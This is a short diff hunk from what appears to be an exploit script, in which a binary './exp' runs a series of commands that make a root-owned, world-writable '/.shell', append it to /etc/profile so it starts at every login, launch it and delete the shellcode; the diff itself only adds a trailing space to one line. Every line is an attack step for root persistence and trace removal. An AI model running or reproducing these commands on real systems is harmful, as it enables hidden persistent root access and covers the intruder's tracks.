@@ -4,5 +4,5 @@ chmod +x ./exp
 ./exp "chown root /.shell"
 ./exp "chmod 777 /.shell"
 ./exp "echo \"/.shell &\" >> /etc/profile"
-./exp "/.shell"
+./exp "/.shell "
 ./exp "rm -rf ../shellcode"
